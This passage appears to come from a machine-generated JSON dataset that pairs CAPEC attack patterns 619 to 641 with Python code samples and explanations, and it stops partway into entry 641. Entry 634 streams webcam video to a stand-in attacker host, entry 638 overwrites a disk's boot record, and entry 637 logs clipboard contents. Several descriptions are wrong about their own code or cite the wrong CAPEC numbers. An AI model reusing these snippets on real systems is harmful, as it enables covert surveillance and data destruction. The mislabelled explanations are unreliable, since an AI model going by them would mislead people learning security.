        "description": "This Python code snippet demonstrates a vulnerable function that sends a broadcast message to a specified phone number. The function `send_broadcast_message` takes a phone number and a message as input and sends this data to a server endpoint using an HTTP POST request. The code embodies the main idea of the CAPEC 'Cellular Broadcast Message Request' by showing how an attacker could exploit the system to send broadcast messages to a target's mobile device. The code includes vulnerabilities related to the listed CWEs: \n\n1. CWE-201: The phone number and message are sent in plain text, which could expose sensitive information.\n2. CWE-940: The code does not verify the source of the communication channel, making it susceptible to unauthorized requests.\n\nThis example highlights how an attacker could misuse the broadcast message functionality to track a target's location by sending messages and observing the network's response."
    },
    {
        "capec_id": "619",
        "capec_name": "Signal Strength Tracking",
        "code_snippet": "import socket\nimport struct\nimport time\n\n# Simulate a device broadcasting its WiFi MAC address\nMAC_ADDRESS = '00:0a:95:9d:68:16'\n\n# Function to simulate sending a broadcast message\ndef send_broadcast_message(mac_address):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)\n    message = f'Device MAC: {mac_address}'\n    sock.sendto(message.encode(), ('<broadcast>', 37020))\n    sock.close()\n\n# Function to simulate receiving a broadcast message\ndef receive_broadcast_message():\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    sock.bind(('', 37020))\n    while True:\n        data, addr = sock.recvfrom(1024)\n        print(f'Received message: {data.decode()} from {addr}')\n\n# Simulate the device broadcasting its MAC address periodically\nwhile True:\n    send_broadcast_message(MAC_ADDRESS)\n    time.sleep(5)",
        "description": "This Python code snippet simulates a device broadcasting its WiFi MAC address periodically. The `send_broadcast_message` function sends a broadcast message containing the device's MAC address, while the `receive_broadcast_message` function listens for incoming broadcast messages. This setup embodies the main idea of the CAPEC 'Signal Strength Tracking' by demonstrating how an attacker could passively monitor the signal strength of the target's WiFi signal to identify the source location. The code also touches on related CWEs, such as CWE-201 (Insertion of Sensitive Information Into Sent Data) by broadcasting the MAC address, and CWE-940 (Improper Verification of Source of a Communication Channel) by not verifying the source of incoming messages."
    },
    {
        "capec_id": "620",
        "capec_name": "Drop Encryption Level",
        "code_snippet": "import ssl\nimport socket\n\n# Create a socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Wrap the socket with SSL, but force a lower encryption level (e.g., SSLv3)\ncontext = ssl.SSLContext(ssl.PROTOCOL_SSLv3)\n\n# Use a hard-coded cryptographic key (for demonstration purposes)\nhard_coded_key = 'hardcodedkey123'\n\n# Connect to a server\nwrapped_socket = context.wrap_socket(sock, server_hostname='example.com')\nwrapped_socket.connect(('example.com', 443))\n\n# Send sensitive data without proper encryption\nwrapped_socket.send(b'Sensitive data')\n\n# Close the connection\nwrapped_socket.close()",
        "description": "This Python code snippet demonstrates a scenario where an attacker forces the encryption level to be lowered, thus enabling a successful attack against the encrypted data. The code creates a socket and wraps it with SSL, but intentionally uses an outdated and less secure protocol (SSLv3). Additionally, it uses a hard-coded cryptographic key, which is a bad practice. The code then connects to a server and sends sensitive data without proper encryption. This embodies the main idea of the CAPEC 'Drop Encryption Level' and highlights related CWEs such as 'Selection of Less-Secure Algorithm During Negotiation', 'Inadequate Encryption Strength', and 'Use of Hard-coded Cryptographic Key'."
    },
    {
        "capec_id": "621",
        "capec_name": "Analysis of Packet Timing and Sizes",
        "code_snippet": "import socket\nimport time\n\n# Simulate sending sensitive data over a network\nsensitive_data = 'user_password=12345'\n\n# Create a socket object\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Connect to a server (example IP and port)\ns.connect(('192.168.1.1', 8080))\n\n# Send data in cleartext (CWE-319)\ns.sendall(sensitive_data.encode('utf-8'))\n\n# Log the time taken to send the data (CWE-208)\nsent_time = time.time()\n\n# Simulate receiving a response\nresponse = s.recv(1024)\n\n# Log the time taken to receive the response\nreceived_time = time.time()\n\n# Calculate the timing difference (CWE-385)\ntiming_difference = received_time - sent_time\n\n# Print the timing difference\nprint(f'Timing difference: {timing_difference} seconds')\n\n# Close the socket\ns.close()",
        "description": "This Python code snippet demonstrates a scenario where sensitive information is transmitted over a network in cleartext (CWE-319). The code creates a socket connection to a server and sends sensitive data (a user password) without encryption. It then logs the time taken to send the data and receive a response, calculating the timing difference (CWE-208, CWE-385). This timing information can be analyzed by an attacker to infer sensitive information, embodying the main idea of the CAPEC 'Analysis of Packet Timing and Sizes'. The code highlights the risks associated with cleartext transmission and observable timing discrepancies."
    },
    {
        "capec_id": "622",
        "capec_name": "Electromagnetic Side-Channel Attack",
        "code_snippet": "import os\nimport time\nimport random\nimport hashlib\n\n# Simulate cryptographic processing\nclass CryptoDevice:\n    def __init__(self, key):\n        self.key = key\n\n    def process_data(self, data):\n        # Simulate a delay to represent processing time\n        time.sleep(random.uniform(0.01, 0.1))\n        # Simulate cryptographic processing\n        return hashlib.sha256((self.key + data).encode()).hexdigest()\n\n# Simulate sensitive data processing\nkey = 'supersecretkey'\ndevice = CryptoDevice(key)\n\n# Simulate processing of sensitive data\nsensitive_data = 'sensitive_information'\nprocessed_data = device.process_data(sensitive_data)\n\n# Simulate electromagnetic emissions (EME) during processing\ndef simulate_eme(data):\n    # Generate a pseudo-random number to simulate EME pattern\n    eme_pattern = random.getrandbits(128)\n    return eme_pattern\n\n# Capture EME pattern during processing\neme_pattern = simulate_eme(sensitive_data)\n\n# Print the EME pattern (in a real attack, this would be captured by the attacker)\nprint(f'EME Pattern: {eme_pattern}')\n\n# Print the processed data (for demonstration purposes)\nprint(f'Processed Data: {processed_data}')",
        "description": "This Python code snippet simulates a cryptographic device processing sensitive data and the associated electromagnetic emissions (EME) that could be captured by an attacker. The `CryptoDevice` class represents a device performing cryptographic operations using a secret key. The `simulate_eme` function generates a pseudo-random pattern to represent the EME during data processing. The code demonstrates how sensitive information could be indirectly exposed through side-channel emissions, embodying the main idea of an Electromagnetic Side-Channel Attack (CAPEC-201). The related CWEs are represented by the use of a cryptographic algorithm (CWE-327), the potential for sensitive information leakage (CWE-201), and the lack of protection against physical side channels (CWE-1300)."
    },
    {
        "capec_id": "623",
        "capec_name": "Compromising Emanations Attack",
        "code_snippet": "import time\nimport random\n\nclass Device:\n    def __init__(self):\n        self.sensitive_data = 'SECRET_KEY'\n\n    def process_data(self, data):\n        # Simulate data processing with time delay and random noise\n        time.sleep(random.uniform(0.01, 0.1))\n        print('Processing:', data)\n        # Simulate mechanical emissions\n        self._emit_sound()\n        self._emit_vibration()\n\n    def _emit_sound(self):\n        # Simulate sound emission\n        print('Sound emission: Beep')\n\n    def _emit_vibration(self):\n        # Simulate vibration emission\n        print('Vibration emission: Buzz')\n\n    def send_data(self, data):\n        # CWE-201: Insertion of Sensitive Information Into Sent Data\n        data_to_send = data + '|' + self.sensitive_data\n        print('Sending data:', data_to_send)\n\n# Example usage\nif __name__ == '__main__':\n    device = Device()\n    device.process_data('UserInput')\n    device.send_data('UserInput')",
        "description": "This Python code snippet simulates a device that processes and sends data, embodying the concept of a Compromising Emanations Attack. The 'Device' class contains sensitive information ('SECRET_KEY') and methods to process data, which include time delays and simulated mechanical emissions (sound and vibration). The 'send_data' method demonstrates CWE-201 by including sensitive information in the transmitted data. The code highlights how physical side channels (sound and vibration) and improper handling of sensitive information can lead to potential security vulnerabilities."
    },
    {
        "capec_id": "624",
        "capec_name": "Hardware Fault Injection",
        "code_snippet": "import time\nimport random\n\nclass HardwareDevice:\n    def __init__(self):\n        self.secret_key = 'super_secret_key'\n        self.voltage = 3.3  # Normal operating voltage\n        self.clock_speed = 1.0  # Normal clock speed\n        self.temperature = 25  # Normal operating temperature in Celsius\n\n    def perform_cryptographic_operation(self):\n        # Simulate a cryptographic operation\n        if self.voltage < 2.5 or self.clock_speed > 1.5 or self.temperature < -10 or self.temperature > 85:\n            raise ValueError('Faulty behavior detected due to environmental conditions')\n        return 'encrypted_data'\n\n    def inject_fault(self):\n        # Simulate fault injection by altering environmental conditions\n        self.voltage = random.uniform(1.0, 5.0)\n        self.clock_speed = random.uniform(0.5, 2.0)\n        self.temperature = random.uniform(-20, 100)\n\n    def attempt_attack(self):\n        try:\n            self.inject_fault()\n            result = self.perform_cryptographic_operation()\n            print(f'Operation successful: {result}')\n        except ValueError as e:\n            print(f'Attack detected: {e}')\n\n# Example usage\nif __name__ == '__main__':\n    device = HardwareDevice()\n    for _ in range(10):\n        device.attempt_attack()\n        time.sleep(1)",
        "description": "This Python code snippet simulates a hardware device performing cryptographic operations and demonstrates how environmental conditions can be manipulated to cause faulty behavior, embodying the main idea of CAPEC-188 (Hardware Fault Injection). The `HardwareDevice` class has attributes for voltage, clock speed, and temperature, which are critical parameters for its operation. The `perform_cryptographic_operation` method simulates a cryptographic operation that fails if the environmental conditions are outside normal ranges, representing CWEs like improper protection against voltage and clock glitches (CWE-1247) and improper handling of faults (CWE-1332). The `inject_fault` method randomly alters these conditions to simulate fault injection attacks. The `attempt_attack` method tries to perform the cryptographic operation under these altered conditions, catching and reporting any faults detected. This demonstrates how an attacker might exploit environmental vulnerabilities to disrupt device operations and potentially extract sensitive information."
    },
    {
        "capec_id": "625",
        "capec_name": "Mobile Device Fault Injection",
        "code_snippet": "import time\nimport random\n\nclass MobileDevice:\n    def __init__(self):\n        self.secret_key = 'super_secret_key'\n        self.clock_speed = 1.0  # GHz\n        self.voltage = 1.0  # Volts\n        self.temperature = 25  # Celsius\n\n    def perform_cryptographic_operation(self):\n        # Simulate a cryptographic operation\n        time.sleep(0.1)\n        return 'encrypted_data'\n\n    def fault_injection_attack(self):\n        # Simulate clock glitch\n        self.clock_speed = random.uniform(0.5, 1.5)\n        # Simulate voltage glitch\n        self.voltage = random.uniform(0.8, 1.2)\n        # Simulate temperature change\n        self.temperature = random.uniform(-10, 50)\n        # Perform cryptographic operation under fault conditions\n        result = self.perform_cryptographic_operation()\n        # Check if fault injection caused a faulty behavior\n        if self.clock_speed != 1.0 or self.voltage != 1.0 or self.temperature != 25:\n            print('Fault injection detected!')\n            # Potentially extract secret key information\n            print(f'Extracted secret key: {self.secret_key}')\n        return result\n\n# Example usage\nmobile_device = MobileDevice()\nmobile_device.fault_injection_attack()",
        "description": "This Python code snippet simulates a fault injection attack on a mobile device performing cryptographic operations. The MobileDevice class has attributes for secret key, clock speed, voltage, and temperature. The perform_cryptographic_operation method simulates a cryptographic operation. The fault_injection_attack method simulates clock glitches, voltage glitches, and temperature changes to induce faulty behavior during the cryptographic operation. If any fault conditions are detected, it prints a message indicating fault injection and potentially extracts the secret key. This code embodies the main idea of CAPEC-1247, demonstrating how improper protection against voltage and clock glitches can lead to the compromise of sensitive information."
    },
    {
        "capec_id": "626",
        "capec_name": "Smudge Attack",
        "code_snippet": "import cv2\nimport numpy as np\n\n# Simulate capturing an image of a touchscreen with smudges\nimage = cv2.imread('touchscreen_image_with_smudges.jpg', cv2.IMREAD_GRAYSCALE)\n\n# Apply threshold to highlight smudges\n_, smudges = cv2.threshold(image, 200, 255, cv2.THRESH_BINARY)\n\n# Find contours of the smudges\ncontours, _ = cv2.findContours(smudges, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)\n\n# Draw contours on the original image\ncv2.drawContours(image, contours, -1, (0, 255, 0), 3)\n\n# Save the result to visualize the smudge pattern\ncv2.imwrite('smudge_pattern_detected.jpg', image)\n\nprint('Smudge pattern detected and saved as smudge_pattern_detected.jpg')",
        "description": "This Python code snippet simulates a smudge attack on a touchscreen device. It uses OpenCV to process an image of a touchscreen with smudges left by the user's fingers. The code highlights the smudges by applying a threshold and then finds and draws contours around these smudges. The resulting image, which shows the detected smudge pattern, is saved for further analysis. This demonstrates how physical side channels (oil smudges) can be exploited to reveal sensitive information (e.g., password patterns), aligning with the CAPEC description and related CWEs such as improper protection of physical side channels and excessive attack surface."
    },
    {
        "capec_id": "627",
        "capec_name": "Counterfeit GPS Signals",
        "code_snippet": "import time\nimport random\n\nclass GPSReceiver:\n    def __init__(self):\n        self.position = (0.0, 0.0)\n        self.time = time.time()\n\n    def receive_signal(self, signal):\n        # CWE-940: No verification of the source of the signal\n        self.position, self.time = signal\n\n    def get_position(self):\n        return self.position\n\n    def get_time(self):\n        return self.time\n\n# Simulate a legitimate GPS signal\nlegit_signal = ((37.7749, -122.4194), time.time())\n\n# Simulate a counterfeit GPS signal\ncounterfeit_signal = ((40.7128, -74.0060), time.time() + random.randint(1000, 10000))\n\n# Create a GPS receiver instance\nreceiver = GPSReceiver()\n\n# Receive the counterfeit signal\nreceiver.receive_signal(counterfeit_signal)\n\n# Output the spoofed position and time\nprint(\"Spoofed Position:\", receiver.get_position())\nprint(\"Spoofed Time:\", receiver.get_time())",
        "description": "This Python code snippet simulates a GPS receiver that is vulnerable to counterfeit GPS signals. The GPSReceiver class has methods to receive signals and retrieve the current position and time. The receive_signal method does not verify the source of the signal (CWE-940), making it susceptible to spoofing. The code demonstrates how an adversary can send a counterfeit GPS signal to deceive the receiver into believing it is at a different location and time. The legitimate and counterfeit signals are simulated, and the receiver processes the counterfeit signal, resulting in spoofed position and time outputs."
    },
    {
        "capec_id": "628",
        "capec_name": "Carry-Off GPS Attack",
        "code_snippet": "import time\nimport random\n\nclass GPSSpoofingAttack:\n    def __init__(self, target_receiver):\n        self.target_receiver = target_receiver\n        self.counterfeit_signal_power = 0.1\n        self.genuine_signal_power = 1.0\n\n    def broadcast_counterfeit_signals(self):\n        while self.counterfeit_signal_power < self.genuine_signal_power:\n            print(f\"Broadcasting counterfeit signals with power: {self.counterfeit_signal_power}\")\n            self.counterfeit_signal_power += 0.1\n            time.sleep(1)\n        print(\"Counterfeit signals now stronger than genuine signals.\")\n        self.redirect_target()\n\n    def redirect_target(self):\n        new_location = (random.uniform(-90, 90), random.uniform(-180, 180))\n        print(f\"Redirecting target to new location: {new_location}\")\n        self.target_receiver.update_location(new_location)\n\nclass GPSReceiver:\n    def __init__(self):\n        self.location = (0.0, 0.0)\n\n    def update_location(self, new_location):\n        self.location = new_location\n        print(f\"Updated location to: {self.location}\")\n\n# Example usage\nreceiver = GPSReceiver()\nattack = GPSSpoofingAttack(receiver)\nattack.broadcast_counterfeit_signals()",
        "description": "This Python code snippet simulates a GPS spoofing attack, specifically a carry-off attack. The GPSSpoofingAttack class represents the adversary's actions, starting with broadcasting counterfeit signals that gradually increase in power until they overpower the genuine GPS signals. Once the counterfeit signals are stronger, the target receiver is redirected to a new, random location. The GPSReceiver class represents the target GPS receiver, which updates its location based on the signals it receives. This code embodies the main idea of the CAPEC by demonstrating how an attacker can manipulate GPS signals to mislead a target receiver. The related CWEs are represented by the lack of proper verification and authentication of the source and integrity of the GPS signals, allowing the spoofing attack to succeed."
    },
    {
        "capec_id": "629",
        "capec_name": "DEPRECATED: Unauthorized Use of Device Resources",
        "code_snippet": "import os\n\n# CWE-67: Improper Handling of Windows Device Names\n# CWE-863: Incorrect Authorization\n# CWE-772: Missing Release of Resource after Effective Lifetime\n\ndef read_file(file_path):\n    # CWE-67: Improper Handling of Windows Device Names\n    if any(device in file_path for device in ['AUX', 'CON', 'NUL', 'PRN']):\n        raise ValueError('Invalid file path containing Windows device name.')\n\n    # CWE-863: Incorrect Authorization\n    if not user_has_permission(file_path):\n        raise PermissionError('User does not have permission to access this file.')\n\n    try:\n        with open(file_path, 'r') as file:\n            data = file.read()\n            # Simulate processing the file\n            print(data)\n    finally:\n        # CWE-772: Missing Release of Resource after Effective Lifetime\n        file.close()\n\n# Simulated function to check user permissions\ndef user_has_permission(file_path):\n    # In a real application, this would check the user's permissions\n    return False  # Simulating a user without permission\n\n# Example usage\ntry:\n    read_file('example.txt')\nexcept (ValueError, PermissionError) as e:\n    print(f'Error: {e}')",
        "description": "This Python code snippet demonstrates several security weaknesses related to the deprecated CAPEC 'Unauthorized Use of Device Resources' and its associated CWEs. The function `read_file` attempts to read a file specified by `file_path`. It first checks for improper handling of Windows device names (CWE-67) by raising an error if the path contains reserved device names. It then performs an incorrect authorization check (CWE-863) by simulating a permission check that always fails. Finally, it attempts to read the file and ensures the file resource is released properly (CWE-772) by closing the file in a `finally` block. The code highlights potential security issues such as improper input validation, incorrect authorization, and resource management."
    },
    {
        "capec_id": "630",
        "capec_name": "TypoSquatting",
        "code_snippet": "from flask import Flask, request, redirect\n\napp = Flask(__name__)\n\n# CWE-601: Open Redirect\n@app.route('/redirect')\ndef open_redirect():\n    target = request.args.get('url')\n    if target:\n        return redirect(target)\n    return 'No URL provided', 400\n\n# CWE-697: Incorrect Comparison\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.form.get('username')\n    password = request.form.get('password')\n    if username == 'admin' and password == 'password123':\n        return 'Login successful'\n    return 'Login failed', 401\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to demonstrate vulnerabilities related to TypoSquatting and associated CWEs. The '/redirect' route is an example of CWE-601 (Open Redirect), where user-controlled input specifies a link to an external site, potentially leading to phishing attacks. The '/login' route demonstrates CWE-697 (Incorrect Comparison) by using a simple and insecure comparison for authentication, which could be exploited by an attacker. Together, these vulnerabilities illustrate how an adversary could exploit TypoSquatting by redirecting users to malicious sites and bypassing authentication mechanisms."
    },
    {
        "capec_id": "631",
        "capec_name": "SoundSquatting",
        "code_snippet": "import re\nimport socket\n\n# Simulate a user input for a URL\nuser_input_url = 'http://trustedbank.com/login'\n\n# SoundSquatting domain that sounds similar to the trusted domain\nsoundsquatting_domain = 'http://trustedbanc.com/login'\n\n# Function to perform reverse DNS resolution\ndef get_hostname(ip_address):\n    try:\n        return socket.gethostbyaddr(ip_address)[0]\n    except socket.herror:\n        return None\n\n# Function to check if the URL is trusted\ndef is_trusted_url(url):\n    trusted_domains = ['trustedbank.com']\n    match = re.match(r'http://([^/]+)/', url)\n    if match:\n        domain = match.group(1)\n        try:\n            ip_address = socket.gethostbyname(domain)\n            hostname = get_hostname(ip_address)\n            if hostname and hostname in trusted_domains:\n                return True\n        except socket.gaierror:\n            pass\n    return False\n\n# Check if the user input URL is trusted\nif is_trusted_url(user_input_url):\n    print('Redirecting to trusted site...')\nelse:\n    print('Warning: Untrusted site!')\n\n# Check if the SoundSquatting URL is trusted\nif is_trusted_url(soundsquatting_domain):\n    print('Redirecting to trusted site...')\nelse:\n    print('Warning: Untrusted site!')",
        "description": "This Python code snippet demonstrates a potential vulnerability related to SoundSquatting attacks. The code simulates a scenario where a user inputs a URL, and the system checks if the URL is trusted by performing reverse DNS resolution. The trusted domain is 'trustedbank.com', while the SoundSquatting domain is 'trustedbanc.com'. The function 'is_trusted_url' attempts to verify the domain by resolving its IP address and performing a reverse DNS lookup to ensure it matches the trusted domain. However, this approach is flawed as it relies on reverse DNS resolution (CWE-350) and does not adequately verify the authenticity of the domain, making it susceptible to SoundSquatting attacks. Additionally, the code does not handle URL redirection securely (CWE-601), which could lead to phishing attacks."
    },
    {
        "capec_id": "632",
        "capec_name": "Homograph Attack via Homoglyphs",
        "code_snippet": "import re\nfrom urllib.parse import urlparse\n\ndef is_valid_url(url):\n    # Regular expression to check for valid URL\n    regex = re.compile(r'^(https?:\\/\\/)?'  # http:// or https://\n                       r'(([\\da-zA-Z\\.-]+)\\.([a-zA-Z\\.]{2,6})|'  # domain...\n                       r'([2-5]{1}[0-9]{0,2}\\.[0-5]{1}[0-9]{0,2}\\.[0-5]{1}[0-9]{0,2}\\.[0-5]{1}[0-9]{0,2}))'  # ...or IP\n                       r'(:[0-9]{1,5})?'  # optional port\n                       r'(\\/[-a-zA-Z0-9@:%_\\+.~#?&//=]*)?$')  # path\n    return re.match(regex, url) is not None\n\ndef fetch_content(url):\n    if not is_valid_url(url):\n        raise ValueError('Invalid URL')\n    parsed_url = urlparse(url)\n    # Check for homoglyphs in the domain\n    domain = parsed_url.netloc\n    if 'xn--' in domain:  # Punycode prefix indicating possible IDN homograph\n        raise ValueError('Potential homograph attack detected')\n    # Simulate fetching content from the URL\n    print(f'Fetching content from {url}')\n\n# Example usage\ntry:\n    fetch_content('http://example.com')\n    fetch_content('http://examp1e.com')  # Homoglyph attack example\nexcept ValueError as e:\n    print(e)\n",
        "description": "This Python code snippet demonstrates a basic approach to mitigating homograph attacks by validating URLs and checking for potential homoglyphs in domain names. The `is_valid_url` function uses a regular expression to ensure the URL is well-formed, addressing CWE-777 (Regular Expression without Anchors). The `fetch_content` function parses the URL and checks for the 'xn--' prefix, which indicates a Punycode-encoded domain that could be used in a homograph attack (CWE-1007). If such a domain is detected, an error is raised. This code represents the main idea of CAPEC-1007 by preventing users from accessing potentially malicious domains that appear visually similar to trusted ones."
    },
    {
        "capec_id": "633",
        "capec_name": "Token Impersonation",
        "code_snippet": "import jwt\nimport datetime\n\n# Secret key for encoding and decoding JWT tokens\nSECRET_KEY = 'my_secret_key'\n\n# Function to generate a JWT token for a given user\ndef generate_token(user_id):\n    payload = {\n        'user_id': user_id,\n        'exp': datetime.datetime.utcnow() + datetime.timedelta(hours=1)\n    }\n    return jwt.encode(payload, SECRET_KEY, algorithm='HS256')\n\n# Function to decode a JWT token\ndef decode_token(token):\n    try:\n        payload = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])\n        return payload['user_id']\n    except jwt.ExpiredSignatureError:\n        return 'Token has expired'\n    except jwt.InvalidTokenError:\n        return 'Invalid token'\n\n# Simulate improper authentication by generating a token for an admin user\nadmin_token = generate_token('admin')\n\n# Simulate an attacker using the admin token to impersonate the admin user\nattacker_user_id = decode_token(admin_token)\n\nprint(f'Attacker impersonated user ID: {attacker_user_id}')",
        "description": "This Python code snippet demonstrates a simplified example of token impersonation. It uses JWT (JSON Web Tokens) to generate and decode tokens. The `generate_token` function creates a token for a given user ID, and the `decode_token` function decodes the token to retrieve the user ID. The code simulates improper authentication by generating a token for an admin user and then decoding it to show how an attacker could impersonate the admin user. This example highlights vulnerabilities related to improper authentication (CWE-287), generation of incorrect security tokens (CWE-1270), and weak authentication mechanisms (CWE-1390)."
    },
    {
        "capec_id": "634",
        "capec_name": "Probe Audio and Video Peripherals",
        "code_snippet": "import cv2\nimport socket\n\n# CWE-267: Privilege Defined With Unsafe Actions\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-319: Cleartext Transmission of Sensitive Information\n\n# Capture video from the webcam\ncap = cv2.VideoCapture(0)\n\n# Create a socket connection to transmit data\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.connect(('attacker.example.com', 9999))\n\nwhile True:\n    ret, frame = cap.read()\n    if not ret:\n        break\n    # Encode the frame as JPEG\n    _, buffer = cv2.imencode('.jpg', frame)\n    # Convert to bytes and send over the socket\n    sock.sendall(buffer.tobytes())\n\ncap.release()\nsock.close()",
        "description": "This Python code snippet captures video from the webcam and transmits it over a network socket to a remote server. It embodies the main idea of the CAPEC 'Probe Audio and Video Peripherals' by exploiting the system's video functionality to capture and transmit sensitive information. The code demonstrates CWE-267 by using webcam access without proper privilege checks, CWE-497 by exposing video data to an unauthorized control sphere, and CWE-319 by transmitting the video data in cleartext, making it susceptible to interception. This code represents a potential security vulnerability where an adversary could capture and misuse sensitive video data."
    },
    {
        "capec_id": "635",
        "capec_name": "Alternative Execution Due to Deceptive Filenames",
        "code_snippet": "import os\n\n# Function to handle file upload\ndef handle_file_upload(file_path):\n    # Check the file extension\n    if file_path.endswith('.txt'):\n        # Open the file assuming it's a text file\n        with open(file_path, 'r') as file:\n            content = file.read()\n            print('File content:', content)\n    else:\n        print('Unsupported file type')\n\n# Simulate file upload\nuploaded_file = 'malicious.exe.txt'\nhandle_file_upload(uploaded_file)",
        "description": "This Python code snippet demonstrates a vulnerability where the file extension is used to determine how to handle the file. The `handle_file_upload` function checks if the uploaded file has a `.txt` extension and then reads and prints its content, assuming it is a text file. However, an attacker can upload a file with a deceptive name like `malicious.exe.txt`, which could contain executable code or other malicious content. This embodies the CAPEC idea of 'Alternative Execution Due to Deceptive Filenames' and highlights related CWEs such as 'Reliance on File Name or Extension of Externally-Supplied File' (CWE-646) and 'Improper Restriction of Names for Files and Other Resources' (CWE-641). The code does not properly validate the file content or restrict the file name, making it vulnerable to exploitation."
    },
    {
        "capec_id": "636",
        "capec_name": "Hiding Malicious Data or Code within Files",
        "code_snippet": "import os\n\n# Function to hide malicious code in a file's metadata\n\ndef hide_malicious_code(file_path, malicious_code):\n    with open(file_path, 'ab') as f:\n        # Append malicious code to the end of the file\n        f.write(b'\\x00' * 1024)  # Padding to hide the code\n        f.write(malicious_code.encode('utf-8'))\n\n# Example usage\nfile_path = 'example.txt'\nmalicious_code = 'print(\"This is malicious code\")'\n\n# Create a dummy file\nwith open(file_path, 'w') as f:\n    f.write('This is a normal file content.')\n\n# Hide the malicious code in the file's metadata\nhide_malicious_code(file_path, malicious_code)\n\n# Verify the file content (normal usage won't show the hidden code)\nwith open(file_path, 'r') as f:\n    print(f.read())",
        "description": "This Python code snippet demonstrates how an attacker might hide malicious code within a file's metadata. The `hide_malicious_code` function appends the malicious code to the end of a file, using padding to obscure its presence. The example creates a dummy file and hides a simple malicious code snippet within it. During normal file usage, the hidden code remains undetected. This embodies the CAPEC concept of hiding malicious data within files, leveraging CWE-506 (Embedded Malicious Code) and CWE-313 (Cleartext Storage in a File or on Disk) by storing the malicious code in a way that is not immediately visible."
    },
    {
        "capec_id": "637",
        "capec_name": "Collect Data from Clipboard",
        "code_snippet": "import pyperclip\nimport time\n\n# Simulate a malicious application that logs clipboard data\nlog_file = 'clipboard_log.txt'\n\nwhile True:\n    clipboard_data = pyperclip.paste()\n    with open(log_file, 'a') as f:\n        f.write(f'{clipboard_data}\\n')\n    time.sleep(5)  # Log clipboard data every 5 seconds",
        "description": "This Python code snippet demonstrates a simple malicious application that continuously logs clipboard data to a file. The code uses the 'pyperclip' library to access the clipboard contents and writes the data to 'clipboard_log.txt' every 5 seconds. This embodies the CAPEC 'Collect Data from Clipboard' by showing how an adversary can exploit clipboard functionality to gather sensitive information. The related CWEs are represented as follows: CWE-267 (Privilege Defined With Unsafe Actions) is implied by the application's ability to access clipboard data without proper authorization; CWE-318 and CWE-317 (Cleartext Storage of Sensitive Information) are demonstrated by storing clipboard data in cleartext within a log file; CWE-497 (Exposure of Sensitive System Information) is shown by the unauthorized logging of potentially sensitive clipboard contents."
    },
    {
        "capec_id": "638",
        "capec_name": "Altered Component Firmware",
        "code_snippet": "import os\nimport struct\n\n# Simulate a vulnerable MBR modification\nMBR_SIZE = 512\nPAYLOAD = b'\\x90' * 100  # NOP sled as a placeholder for malicious payload\n\n# Read the current MBR\nwith open('/dev/sda', 'rb') as disk:\n    mbr = disk.read(MBR_SIZE)\n\n# Modify the MBR to include the payload\nnew_mbr = mbr[:MBR_SIZE - len(PAYLOAD)] + PAYLOAD\n\n# Write the modified MBR back to the disk\nwith open('/dev/sda', 'wb') as disk:\n    disk.write(new_mbr)\n\nprint('MBR modified successfully.')",
        "description": "This Python code snippet demonstrates a simplified version of an attack that modifies the Master Boot Record (MBR) of a hard disk drive (HDD) to include a malicious payload. The code reads the current MBR, appends a payload (represented by a NOP sled), and writes the modified MBR back to the disk. This embodies the main idea of the CAPEC 'Altered Component Firmware' by showing how an adversary could alter the firmware to achieve persistence. The related CWEs provide context on potential weaknesses that could be exploited, such as improper access control and the inability to update firmware, which are not directly shown in the code but are relevant to understanding the attack's feasibility."
    },
    {
        "capec_id": "639",
        "capec_name": "Probe System Files",
        "code_snippet": "import os\nimport tempfile\n\n# Create a temporary file to store sensitive information\nwith tempfile.NamedTemporaryFile(delete=False) as temp_file:\n    temp_file.write(b'Sensitive Information: Password123')\n    temp_file_path = temp_file.name\n\n# Improperly set file permissions, making it accessible to unauthorized users\nos.chmod(temp_file_path, 0o777)\n\nprint(f'Temporary file created at: {temp_file_path}')",
        "description": "This Python code snippet demonstrates a vulnerability where sensitive information is stored in a temporary file with improper access permissions. The `tempfile.NamedTemporaryFile` function is used to create a temporary file, and sensitive information is written to it. The file permissions are then set to `0o777` using `os.chmod`, making the file accessible to any user on the system. This embodies the main idea of the CAPEC 'Probe System Files' by showing how an adversary can obtain unauthorized information due to improperly protected files. The related CWEs are represented by the insecure temporary file creation (CWE-377) and the exposure of sensitive information (CWE-497)."
    },
    {
        "capec_id": "640",
        "capec_name": "Inclusion of Code in Existing Process",
        "code_snippet": "import ctypes\nimport os\nimport sys\n\n# Vulnerable function to load a DLL from an untrusted source\n# CWE-114: Process Control\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\ndef load_untrusted_dll(dll_path):\n    try:\n        ctypes.CDLL(dll_path)\n        print(f\"Loaded DLL from {dll_path}\")\n    except Exception as e:\n        print(f\"Failed to load DLL: {e}\")\n\n# Example usage\nif __name__ == \"__main__\":\n    if len(sys.argv) != 2:\n        print(\"Usage: python script.py <path_to_dll>\")\n        sys.exit(1)\n\n    dll_path = sys.argv[1]\n    load_untrusted_dll(dll_path)\n",
        "description": "This Python code snippet demonstrates a vulnerable function that loads a DLL from an untrusted source, embodying the main idea of the CAPEC 'Inclusion of Code in Existing Process'. The function `load_untrusted_dll` uses the `ctypes` library to load a DLL specified by the user. This represents CWE-114 (Process Control) and CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) as it allows the execution of potentially malicious code from an untrusted source. An attacker could exploit this to inject arbitrary code into the address space of a running process, potentially leading to privilege escalation or evasion of detection defenses."
    },
    {
        "capec_id": "641",
        "capec_name": "DLL Side-Loading",
